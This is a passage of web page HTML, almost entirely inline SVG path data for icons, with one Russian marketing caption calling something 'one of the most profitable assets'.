                        d="M11.2794 77.4613C10.9344 77.4613 10.655 77.182 10.655 76.837V74.3395C10.655 73.9945 10.9344 73.7153 11.2794 73.7153C11.6246 73.7153 11.9038 73.9945 11.9038 74.3395V76.837C11.9039 77.182 11.6246 77.4613 11.2794 77.4613Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M15.65 76.1806C15.305 76.1806 15.0256 75.9014 15.0256 75.5562V73.0612C15.0256 72.7162 15.3049 72.437 15.65 72.437C15.9952 72.437 16.2744 72.7162 16.2744 73.0612V75.5562C16.2742 75.9014 15.995 76.1806 15.65 76.1806Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M6.94566 76.1808C6.60066 76.1808 6.32129 75.9016 6.32129 75.5564V73.0858C6.32129 72.7406 6.60051 72.4614 6.94566 72.4614C7.29082 72.4614 7.57003 72.7406 7.57003 73.0858V75.5564C7.56988 75.9016 7.29066 76.1808 6.94566 76.1808Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M4.45278 57.4868C4.21872 57.4868 3.99497 57.3551 3.88825 57.1294C-3.3339 41.9047 -0.17673 23.6657 11.7451 11.7445C24.1224 -0.630336 42.867 -3.53751 58.3941 4.51199C58.7001 4.67167 58.8196 5.04855 58.6612 5.35464C58.5002 5.65948 58.1257 5.77901 57.8184 5.62167C42.779 -2.17674 24.618 0.639034 12.6279 12.6273C1.07858 24.1766 -1.98032 41.8462 5.01622 56.5954C5.16434 56.9063 5.03153 57.2782 4.71997 57.4269C4.63325 57.4673 4.54247 57.4868 4.45278 57.4868Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M58.106 5.69133C57.9035 5.69133 57.7035 5.59258 57.584 5.40961L56.3354 3.50602C56.1463 3.21696 56.2268 2.8304 56.5144 2.6415C56.8022 2.45244 57.1888 2.53056 57.379 2.82071L58.6277 4.7243C58.8166 5.01336 58.7361 5.39977 58.4485 5.58883C58.3425 5.65836 58.2241 5.69133 58.106 5.69133Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M55.6084 6.28486C55.3255 6.28486 55.0695 6.09221 55.0011 5.80439C54.9206 5.46908 55.128 5.13252 55.4645 5.05315L57.9619 4.45924C58.2911 4.37268 58.6327 4.58612 58.7131 4.92268C58.7937 5.25799 58.5862 5.59455 58.2497 5.67377L55.7523 6.26767C55.7048 6.27986 55.6559 6.28486 55.6084 6.28486Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M40.0266 79.9999C33.7715 79.9999 27.4609 78.5219 21.6077 75.488C21.3016 75.3283 21.182 74.9513 21.3406 74.6452C21.4986 74.3404 21.8759 74.2185 22.182 74.3782C37.2249 82.1789 55.3842 79.3596 67.3737 67.3726C78.9218 55.8232 81.9802 38.1549 74.9843 23.4046C74.8368 23.0937 74.9696 22.7218 75.2818 22.5731C75.5867 22.4279 75.9646 22.5571 76.1134 22.8706C83.3337 38.0952 80.1766 56.3343 68.2565 68.2555C60.5461 75.9649 50.3638 79.9999 40.0266 79.9999Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M23.1427 77.4613C22.9391 77.4613 22.7396 77.3625 22.6202 77.1796L21.3727 75.276C21.1838 74.9869 21.2641 74.6005 21.5526 74.4114C21.8416 74.2211 22.2288 74.303 22.4166 74.5906L23.6641 76.4942C23.8532 76.7833 23.7726 77.1697 23.4843 77.3588C23.3787 77.4285 23.2598 77.4613 23.1427 77.4613Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M21.8941 75.5576C21.6117 75.5576 21.3558 75.3651 21.2874 75.0786C21.2075 74.742 21.4147 74.4053 21.7502 74.3261L24.2464 73.7323C24.5842 73.6529 24.9183 73.8592 24.9983 74.1945C25.0781 74.5309 24.871 74.8676 24.5355 74.9467L22.0392 75.5406C21.9905 75.5528 21.9424 75.5576 21.8941 75.5576Z"
                        fill="#116FFF"
                      ></path>
                    </g>
                  </svg>
                </div>
                <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">
Один из самых прибыльных активов                </p>
              </div>
              <div class="flex items-center mb-10">
                <div class="w-1/5">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="100%"
                    height="100%"
                    viewBox="0 0 80 80"
                    fill="none"
                  >
                    <g>
                      <path
                        d="M57.7253 28.5754C58.4504 27.8381 58.4504 26.6504 57.7253 25.926L55.9505 24.1505C55.2254 23.4261 54.0389 23.4261 53.3005 24.1505C52.5632 24.8885 52.5632 26.0756 53.3005 26.8133L55.0632 28.5754C55.8003 29.3132 56.9881 29.3132 57.7253 28.5754ZM55.5136 2.50146L79.3752 26.3629L49.9706 55.8918L49.8131 52.7998L48.1261 20.0006C48.0517 17.9382 46.3013 16.2508 44.2385 16.2508H41.7726L55.5136 2.50146ZM59.488 24.1505C60.2253 24.8885 61.4131 24.8885 62.138 24.1505C62.8753 23.4261 62.8753 22.2383 62.138 21.5012L60.3753 19.7385C59.638 19.0012 58.4503 19.0012 57.7253 19.7385C56.9881 20.4636 56.9881 21.6507 57.7253 22.3885L59.488 24.1505Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M49.7922 52.3937L45.3528 16.2511L53.1429 8.39813L57.2761 7.80176L74.0747 24.601L73.2839 28.9289L49.7922 52.3937Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M50.6248 19.9104C50.5016 16.5243 47.6525 13.7705 44.2676 13.7539L41.7726 16.2508H44.2385C44.6351 16.2508 45.0135 16.3301 45.3773 16.4449L49.7924 52.391L49.8132 52.7998L49.9707 55.8918L52.3472 53.5054L50.6248 19.9104Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M50.6247 19.9104C50.5381 17.5448 49.1087 15.5118 47.1081 14.481L45.3528 16.2508L45.3772 16.4449L49.7924 52.3911V52.3936L52.1689 50.0206L50.6247 19.9104Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M60.3752 19.7385L62.1379 21.5012C62.8752 22.2385 62.8752 23.4263 62.1379 24.1506C61.4128 24.8885 60.2252 24.8885 59.4879 24.1506L57.7252 22.3885C56.9879 21.6506 56.9879 20.4635 57.7252 19.7385C58.4503 19.0012 59.6381 19.0012 60.3752 19.7385Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M55.9504 24.1508L57.7253 25.9263C58.4504 26.6508 58.4504 27.8385 57.7253 28.5756C56.988 29.3136 55.8002 29.3136 55.0631 28.5756L53.3004 26.8136C52.5631 26.0757 52.5631 24.8885 53.3004 24.1508C54.039 23.4263 55.2255 23.4263 55.9504 24.1508Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M65.0005 77.4985C60.8503 77.4985 57.5009 74.1356 57.5009 69.9989V67.499C57.5009 71.6358 60.8503 74.9987 65.0005 74.9987C69.1373 74.9987 72.5002 71.6358 72.5002 67.499V69.9989C72.5002 74.1356 69.1373 77.4985 65.0005 77.4985Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M61.1029 73.8977C58.9435 72.5806 57.5009 70.2089 57.5009 67.499V69.9989C57.5009 74.1356 60.8503 77.4985 65.0005 77.4985C65.4266 77.4985 65.8415 77.4547 66.2491 77.3862C64.0654 77.019 62.2113 75.7142 61.1029 73.8977Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M77.5 50V52.4998C77.5 55.2621 75.2625 57.4997 72.5002 57.4997C69.7379 57.4997 67.5004 55.2621 67.5004 52.4998V50C67.5004 52.7623 69.7379 54.9998 72.5002 54.9998C75.2625 54.9998 77.5 52.7623 77.5 50Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M70.4496 54.5501C68.7138 53.7664 67.5006 52.0295 67.5006 49.9995V52.4993C67.5006 55.2616 69.7381 57.4992 72.5004 57.4992C72.9349 57.4992 73.3488 57.426 73.7504 57.3221C72.2746 56.9414 71.066 55.9149 70.4496 54.5501Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M72.5002 45C75.2625 45 77.5 47.2374 77.5 49.9998C77.5 52.7621 75.2625 54.9997 72.5002 54.9997C69.7379 54.9997 67.5004 52.7621 67.5004 49.9998C67.5004 47.2372 69.7379 45 72.5002 45Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M70.0004 49.9998C70.0004 47.672 71.597 45.7335 73.7504 45.1769C73.3488 45.0732 72.9349 45 72.5004 45C69.7381 45 67.5006 47.2374 67.5006 49.9998C67.5006 52.7621 69.7381 54.9997 72.5004 54.9997C72.9349 54.9997 73.3488 54.9263 73.7504 54.8226C71.597 54.266 70.0004 52.3275 70.0004 49.9998Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M72.5002 67.4992C72.5002 71.6359 69.1373 74.9988 65.0005 74.9988C60.8503 74.9988 57.5009 71.6359 57.5009 67.4992C57.5009 63.3624 60.8503 59.9995 65.0005 59.9995C69.1373 59.9995 72.5002 63.3624 72.5002 67.4992Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M60.0007 67.4992C60.0007 63.7883 62.6982 60.7087 66.2491 60.1118C65.8415 60.0435 65.4264 59.9995 65.0005 59.9995C60.8503 59.9995 57.5009 63.3624 57.5009 67.4992C57.5009 71.6359 60.8503 74.9988 65.0005 74.9988C65.4266 74.9988 65.8415 74.9549 66.2491 74.8865C62.6982 74.2897 60.0007 71.21 60.0007 67.4992Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M43.8393 21.2505L44.0395 29.0626H7.35278L7.59083 21.2505H43.8393Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M4.23983 72.4986H47.014C48.9889 72.4986 50.5757 70.9363 50.6259 68.9868V72.4986C50.7005 74.5614 49.0757 76.2486 47.014 76.2486H4.23983C2.17809 76.2486 0.553499 74.5616 0.627948 72.4986V68.9868C0.677998 70.9363 2.25269 72.4986 4.23983 72.4986Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M34.577 51.2495L34.627 57.4993H27.1895V51.2495H34.577Z"
                        fill="white"
                      ></path>
                      <path
                        d="M34.6392 59.999L34.6891 66.2488H27.1895V59.999H34.6392Z"
                        fill="white"
                      ></path>
                      <path
                        d="M44.6642 42.5L45.3137 66.2493H37.1891L37.0267 42.5H44.6642Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M44.4263 33.7505L44.6143 40.0001H37.0145L36.9645 33.7505H44.4263Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M34.5268 42.5L34.5648 48.7498H27.1895V42.5H34.5268Z"
                        fill="white"
                      ></path>
                      <path
                        d="M34.4647 33.7896L34.5147 40.0394H27.1895V33.7896H34.4647Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M24.6897 33.7896V40.0394H17.4402L17.6648 33.7896H24.6897Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M15.1649 33.7505L14.9403 40.0001H7.34058L7.70297 33.7505H15.1649Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M24.6895 42.5V48.7498H17.1519L17.3777 42.5H24.6895Z"
                        fill="white"
                      ></path>
                      <path
                        d="M14.8781 42.5L14.6522 48.7498H6.87793L7.24032 42.5H14.8781Z"
                        fill="white"
                      ></path>
                      <path
                        d="M24.6897 51.25V57.4998H16.853L17.0776 51.25H24.6897Z"
                        fill="white"
                      ></path>
                      <path
                        d="M14.5778 51.25L14.3532 57.4998H6.40308L6.76562 51.25H14.5778Z"
                        fill="white"
                      ></path>
                      <path
                        d="M14.2897 59.9995L14.0651 66.2115C14.0651 66.2249 5.94043 66.2493 5.94043 66.2493L6.30298 59.9995H14.2897Z"
                        fill="white"
                      ></path>
                      <path
                        d="M24.6898 59.9995V66.2493H16.5652L16.7898 59.9995H24.6898Z"
                        fill="white"
                      ></path>
                      <path
                        d="M37.189 66.2491H45.3137L44.6643 42.4998H37.0267L37.189 66.2491ZM44.6143 39.9999L44.4263 33.7503H36.9644L37.0145 39.9999H44.6143ZM5.94025 66.2491C5.94025 66.2491 14.0649 66.2247 14.0649 66.2112L14.2895 59.9993H6.3028L5.94025 66.2491ZM14.353 57.4994L14.5776 51.2496H6.76545L6.4029 57.4994H14.353ZM14.6521 48.7496L14.8779 42.4998H7.24014L6.87775 48.7496H14.6521ZM14.9402 39.9999L15.1648 33.7503H7.70279L7.3404 39.9999H14.9402ZM24.6896 39.9999V33.7503H17.6646L17.44 39.9999H24.6896ZM24.6896 48.7496V42.4998H17.3777L17.1519 48.7496H24.6896ZM24.6896 57.4994V51.2496H17.0776L16.853 57.4994H24.6896ZM24.6896 66.2491V59.9993H16.7895L16.5649 66.2491H24.6896ZM34.5147 39.9999L34.4646 33.7503H27.1894V39.9999H34.5147ZM34.5647 48.7496L34.5269 42.4998H27.1896V48.7496H34.5647ZM34.627 57.4994L34.5769 51.2496H27.1896V57.4994H34.627ZM34.6392 59.9993H27.1896V66.2491H34.6892L34.6392 59.9993ZM50.6259 68.7491C50.6259 68.8235 50.6259 68.9114 50.6259 68.987C50.5758 70.9364 48.9889 72.4987 47.014 72.4987H4.23981C2.25252 72.4987 0.67798 70.9364 0.62793 68.987C0.62793 68.9114 0.62793 68.8234 0.62793 68.7491L3.12776 20.0008C3.20221 17.9384 4.95271 16.251 7.01554 16.251H44.2383C46.3011 16.251 48.0516 17.9386 48.1259 20.0008L49.8129 52.8L50.6259 68.7491ZM44.0393 29.0628L43.8391 21.2506H7.59065L7.3526 29.0628H44.0393Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M14.9855 38.7485H7.41252L7.34058 40.0002H14.9403L14.9855 38.7485Z"
                        fill="#2287FF"
                      ></path>
                      <path
                        d="M24.6897 38.7485H17.4854L17.4402 40.0002H24.6897V38.7485Z"
                        fill="#2287FF"
                      ></path>
                      <path
                        d="M15.1648 33.7505H7.70284L7.62964 35.002H15.1196L15.1648 33.7505Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M14.6974 47.4976H6.94988L6.87793 48.7497H14.6522L14.6974 47.4976Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M14.3984 56.2471H6.47502L6.40308 57.4996H14.3532L14.3984 56.2471Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M14.109 64.9966H6.01363L5.94043 66.2491L14.0651 66.2112L14.109 64.9966Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M24.6898 64.9966H16.6104L16.5652 66.2491L24.6898 66.2112V64.9966Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M34.6797 64.9966H27.1897V66.2491H34.6894L34.6797 64.9966Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M24.6897 56.2471H16.8982L16.853 57.4996H24.6897V56.2471Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M34.6174 56.2471H27.1897V57.4996H34.6273L34.6174 56.2471Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M24.6895 47.4976H17.1972L17.1519 48.7497H24.6895V47.4976Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M34.565 47.4976H27.1897L27.1714 48.7497H34.565V47.4976Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M24.6896 33.7505H17.6647L17.6196 35.0411H24.6896V33.7505Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M34.5013 38.7485H27.1895V40.0002H34.5147L34.5013 38.7485Z"
                        fill="#2287FF"
                      ></path>
                      <path
                        d="M34.4647 33.7505H27.1895V35.0411H34.4744L34.4647 33.7505Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M44.5764 38.7485H36.9645L37.0145 40.0002H44.6143L44.5764 38.7485Z"
                        fill="#2287FF"
                      ></path>
                      <path
                        d="M44.4263 33.7505H36.9645L36.9743 35.0411H44.4654L44.4263 33.7505Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M44.6642 42.5H37.0267L37.0352 43.7916H44.6997L44.6642 42.5Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M45.2794 64.9966H37.1804L37.189 66.2491H45.3528L45.2794 64.9966Z"
                        fill="#2287FF"
                      ></path>
                      <path
                        d="M52.0138 20.8042C51.6683 20.8042 51.3827 20.5247 51.3827 20.1792C51.3827 19.8337 51.6561 19.5542 52.0003 19.5542H52.0138C52.3579 19.5542 52.6386 19.8337 52.6386 20.1792C52.6388 20.5245 52.358 20.8042 52.0138 20.8042Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M53.7814 19.0366C53.4359 19.0366 53.1503 18.7571 53.1503 18.4116C53.1503 18.0661 53.4237 17.7866 53.7679 17.7866H53.7814C54.1255 17.7866 54.4062 18.0661 54.4062 18.4116C54.4062 18.7571 54.1255 19.0366 53.7814 19.0366Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M55.5489 17.269C55.2034 17.269 54.9178 16.9895 54.9178 16.644C54.9178 16.2985 55.1912 16.019 55.5355 16.019H55.5489C55.893 16.019 56.1738 16.2985 56.1738 16.644C56.1738 16.9895 55.893 17.269 55.5489 17.269Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M53.1259 49.7119C52.966 49.7119 52.8062 49.6507 52.684 49.5287C52.4399 49.2844 52.4399 48.889 52.684 48.645L73.2375 28.0914C72.554 27.0477 72.5527 25.6831 73.2362 24.6461L57.2311 8.64079C56.1958 9.32429 54.8299 9.32366 53.7851 8.63892L48.2432 14.1923C47.999 14.4377 47.6037 14.4366 47.3595 14.1935C47.1154 13.9494 47.1154 13.554 47.3595 13.3098L53.2968 7.36046C53.541 7.11678 53.934 7.11615 54.1782 7.35686C54.9142 8.08493 56.1081 8.0868 56.8343 7.35999C57.0784 7.11568 57.474 7.11568 57.7179 7.35999L74.5166 24.1592C74.7609 24.4034 74.7609 24.7988 74.5166 25.0429C73.7902 25.7697 73.7915 26.9612 74.5191 27.699C74.7609 27.9431 74.7596 28.3368 74.5166 28.5797L53.5677 49.5287C53.4457 49.6507 53.2857 49.7119 53.1259 49.7119Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M53.1259 53.2492C52.9661 53.2492 52.8063 53.188 52.6841 53.066C52.44 52.8217 52.44 52.4263 52.6841 52.1823L78.4912 26.3628L55.5136 3.38512L44.7058 14.1928C44.4617 14.4371 44.0663 14.4371 43.8222 14.1928C43.578 13.9486 43.578 13.5532 43.8222 13.3091L55.0718 2.05958C55.3159 1.81543 55.7115 1.81543 55.9555 2.05958L79.8169 25.921C80.0612 26.1651 80.0612 26.5605 79.8169 26.8047L53.5678 53.066C53.4458 53.188 53.2858 53.2492 53.1259 53.2492Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M55.5136 36.7128C55.3538 36.7128 55.1938 36.6517 55.0718 36.5303C54.8276 36.2862 54.8276 35.8906 55.0718 35.646L65.6708 25.0335C65.9149 24.7894 66.3105 24.79 66.5545 25.0329C66.7986 25.2771 66.7986 25.6725 66.5545 25.9172L55.9555 36.5297C55.8333 36.6517 55.6735 36.7128 55.5136 36.7128Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M53.7388 33.1755C53.579 33.1755 53.419 33.1143 53.297 32.9923L50.7471 30.4423C50.5028 30.1981 50.5028 29.8027 50.7471 29.5586C50.9912 29.3145 51.3866 29.3145 51.6308 29.5586L54.1806 32.1086C54.4248 32.3528 54.4248 32.7482 54.1806 32.9923C54.0587 33.1143 53.8986 33.1755 53.7388 33.1755Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M56.3948 29.7539C55.7261 29.7539 55.0961 29.492 54.6212 29.0172L52.8585 27.2551C51.8808 26.2774 51.8808 24.6861 52.8585 23.7085C53.8167 22.7672 55.4561 22.7722 56.3923 23.7085L58.1672 25.484C59.134 26.4495 59.1351 28.0326 58.1708 29.0134C57.6924 29.492 57.0625 29.7539 56.3948 29.7539ZM54.6311 24.2321C54.2942 24.2321 53.9781 24.3616 53.7388 24.5965C53.253 25.083 53.253 25.8806 53.7424 26.3714L55.5051 28.1335C55.9824 28.609 56.8026 28.6108 57.2835 28.1335C57.7645 27.6439 57.767 26.8505 57.2835 26.3678L55.5087 24.5923C55.2769 24.3604 54.9644 24.2321 54.6311 24.2321Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M60.8174 25.3289C60.1497 25.3289 59.5211 25.0671 59.0462 24.5923L57.2835 22.8302C56.8062 22.3522 56.545 21.7192 56.5475 21.0475C56.55 20.3823 56.8136 19.7592 57.2871 19.2928C58.2076 18.3534 59.8664 18.3448 60.8172 19.2964L62.5799 21.059C63.0573 21.5362 63.3185 22.1698 63.316 22.8413C63.3135 23.5071 63.0499 24.1302 62.5763 24.596C62.1149 25.0658 61.4874 25.3289 60.8174 25.3289ZM59.0461 19.8103C58.7142 19.8103 58.4029 19.9404 58.1708 20.1766C57.9292 20.4145 57.7986 20.7234 57.7973 21.0531C57.7961 21.3894 57.9267 21.7061 58.1671 21.9466L59.9298 23.7087C60.4084 24.1848 61.2286 24.1861 61.6925 23.7123C61.9343 23.4743 62.0649 23.1654 62.0661 22.8358C62.0674 22.5002 61.9368 22.1827 61.6962 21.9429L59.9335 20.1802C59.6956 19.9415 59.3794 19.8103 59.0461 19.8103Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M52.8634 34.0628C52.7047 34.0628 52.5461 34.0029 52.4239 33.8827C52.1787 33.6405 52.1762 33.2449 52.4178 32.9991L54.1841 31.2212C54.4283 30.977 54.8238 30.977 55.0678 31.2212C55.312 31.4653 55.312 31.8609 55.0678 32.1049L53.3089 33.8766C53.1858 34.0004 53.0245 34.0628 52.8634 34.0628Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M47.0141 73.1239H4.23981C1.92297 73.1239 0.0626767 71.3136 0.00292969 69.0029V68.749L2.50401 19.9691C2.58957 17.5784 4.61455 15.626 7.0157 15.626H44.2384C46.6394 15.626 48.6645 17.5784 48.7512 19.9781L51.251 68.9869C51.1911 71.3136 49.3308 73.1239 47.0141 73.1239ZM7.0157 16.876C5.27865 16.876 3.81516 18.2877 3.75291 20.0235L1.25167 68.7808L1.25292 68.9871C1.29437 70.5984 2.60662 71.874 4.23981 71.874H47.014C48.6472 71.874 49.9594 70.5984 50.0009 68.9711V68.749L47.5023 20.0332C47.4388 18.2875 45.9751 16.8758 44.2382 16.8758H7.0157V16.876Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M47.0142 76.8737H4.23984C3.0729 76.8737 1.98775 76.4159 1.18445 75.5833C0.380058 74.7497 -0.0386407 73.6463 0.00280687 72.477C0.0150065 72.1315 0.321406 71.9006 0.649858 71.874C0.995202 71.8873 1.26516 72.1768 1.2528 72.5209C1.2223 73.3486 1.5176 74.1285 2.08394 74.7156C2.64904 75.3015 3.41449 75.6238 4.23968 75.6238H47.0139C47.8389 75.6238 48.6043 75.3015 49.1694 74.7156C49.7358 74.1285 50.0312 73.3486 50.0006 72.5209C49.9884 72.1768 50.2582 71.8873 50.6035 71.874C50.9478 71.8776 51.2371 72.1315 51.2506 72.477C51.2922 73.6464 50.8733 74.7497 50.0689 75.5833C49.2663 76.4159 48.1811 76.8737 47.0142 76.8737Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M0.627927 73.1236C0.282583 73.1236 0.00292969 72.8441 0.00292969 72.4986V68.9868C0.00292969 68.6413 0.282583 68.3618 0.627927 68.3618C0.973428 68.3618 1.25292 68.6413 1.25292 68.9868V72.4986C1.25292 72.8441 0.973428 73.1236 0.627927 73.1236Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M50.6259 73.1236C50.2804 73.1236 50.0009 72.8441 50.0009 72.4986V68.9868C50.0009 68.6413 50.2804 68.3618 50.6259 68.3618C50.9714 68.3618 51.2508 68.6413 51.2508 68.9868V72.4986C51.251 72.8441 50.9714 73.1236 50.6259 73.1236Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M34.5148 40.6252H27.1897C26.8444 40.6252 26.5647 40.3457 26.5647 40.0002V33.7505C26.5647 33.405 26.8444 33.1255 27.1897 33.1255H34.4649C34.8079 33.1255 35.0874 33.402 35.0899 33.7456L35.14 39.9953C35.1412 40.1619 35.0765 40.3219 34.9581 40.4403C34.8406 40.5587 34.6807 40.6252 34.5148 40.6252ZM27.8145 39.3752H33.885L33.8446 34.3753H27.8145V39.3752Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M44.6143 40.6248H37.0145C36.6715 40.6248 36.392 40.3483 36.3895 40.0048L36.3395 33.755C36.3382 33.5884 36.403 33.4284 36.5214 33.31C36.6385 33.1916 36.7973 33.125 36.9645 33.125H44.4263C44.7645 33.125 45.0404 33.3935 45.0513 33.7311L45.2393 39.9807C45.2442 40.1498 45.1807 40.3134 45.0623 40.4348C44.9451 40.5566 44.7828 40.6248 44.6143 40.6248ZM37.6345 39.3748H43.9696L43.8195 34.375H37.5942L37.6345 39.3748Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M14.9403 40.6248H7.34057C7.16852 40.6248 7.00367 40.5541 6.88652 40.4288C6.76812 40.3039 6.70713 40.1353 6.71682 39.9638L7.07921 33.714C7.09877 33.3832 7.37216 33.125 7.70296 33.125H15.1648C15.3343 33.125 15.4968 33.194 15.614 33.3161C15.7324 33.4381 15.7959 33.603 15.7898 33.7727L15.5652 40.0223C15.5531 40.3588 15.2772 40.6248 14.9403 40.6248ZM8.00326 39.3748H14.3372L14.5166 34.375H8.29261L8.00326 39.3748Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M24.6897 40.6248H17.4401C17.2704 40.6248 17.108 40.556 16.9909 40.4337C16.8725 40.3117 16.809 40.1468 16.8151 39.9771L17.0399 33.7275C17.0521 33.3912 17.328 33.125 17.6649 33.125H24.6898C25.0353 33.125 25.3148 33.4045 25.3148 33.75V39.9998C25.3147 40.3453 25.0352 40.6248 24.6897 40.6248ZM18.0884 39.3748H24.0647V34.375H18.2678L18.0884 39.3748Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M14.3529 58.1243H6.40282C6.23062 58.1243 6.06593 58.0535 5.94878 57.9277C5.83038 57.8032 5.76938 57.6348 5.77908 57.4626L6.14163 51.2129C6.16118 50.8834 6.43457 50.6245 6.76537 50.6245H14.5775C14.7471 50.6245 14.9096 50.6929 15.0267 50.8161C15.1451 50.9381 15.2086 51.1017 15.2025 51.2714L14.9779 57.5212C14.9657 57.8581 14.6898 58.1243 14.3529 58.1243ZM7.06567 56.8743H13.75L13.9294 51.8745H7.35487L7.06567 56.8743Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M34.627 58.1247H27.1895C26.8441 58.1247 26.5645 57.845 26.5645 57.4997V51.2498C26.5645 50.9045 26.8441 50.625 27.1895 50.625H34.5768C34.9198 50.625 35.1993 50.902 35.2018 51.245L35.2519 57.4948C35.2531 57.6609 35.1884 57.822 35.07 57.9404C34.9528 58.0574 34.7942 58.1247 34.627 58.1247ZM27.8144 56.8747H33.997L33.9567 51.8748H27.8144V56.8747Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M24.6895 58.1247H16.8529C16.6832 58.1247 16.5209 58.0561 16.4037 57.9329C16.2853 57.8109 16.2218 57.6473 16.2279 57.4776L16.4527 51.2279C16.4649 50.891 16.7408 50.625 17.0777 50.625H24.6897C25.0352 50.625 25.3147 50.9045 25.3147 51.2498V57.4997C25.3145 57.845 25.035 58.1247 24.6895 58.1247ZM17.5011 56.8747H24.0645V51.8748H17.6805L17.5011 56.8747Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M5.94018 66.8742C5.76798 66.8742 5.60453 66.8035 5.48613 66.679C5.36773 66.5532 5.30673 66.3848 5.31643 66.2127L5.67898 59.9629C5.69853 59.6334 5.97193 59.3745 6.30273 59.3745H14.2894C14.459 59.3745 14.6215 59.4441 14.7399 59.5663C14.857 59.6883 14.9205 59.8531 14.9144 60.0228L14.6898 66.2348C14.6898 66.8476 14.6898 66.8476 5.94252 66.8743C5.94143 66.8742 5.94143 66.8742 5.94018 66.8742ZM6.89222 60.6245L6.60287 65.6218C9.06736 65.6145 12.1923 65.6023 13.4617 65.5937L13.6411 60.6245H6.89222Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M45.3138 66.8741H37.1891C36.8461 66.8741 36.5666 66.5971 36.5641 66.2541L36.4018 42.5048C36.4005 42.3378 36.4665 42.1778 36.5837 42.0594C36.701 41.9408 36.8608 41.875 37.0267 41.875H44.6644C45.0025 41.875 45.2797 42.1448 45.2894 42.4829L45.9388 66.2321C45.9436 66.4004 45.8789 66.5641 45.7617 66.685C45.6446 66.8059 45.4822 66.8741 45.3138 66.8741ZM37.8103 65.6243H44.6716L44.0564 43.125H37.6566L37.8103 65.6243Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M34.6891 66.8742H27.1895C26.8441 66.8742 26.5645 66.5947 26.5645 66.2493V59.9995C26.5645 59.654 26.8441 59.3745 27.1895 59.3745H34.6391C34.982 59.3745 35.2615 59.6515 35.264 59.9947L35.3141 66.2445C35.3154 66.4104 35.2506 66.5717 35.1322 66.6899C35.015 66.8072 34.8552 66.8742 34.6891 66.8742ZM27.8144 65.6243H34.0593L34.0191 60.6245H27.8144V65.6243Z"
                        fill="#116FFF"
                      ></path>
                      <path
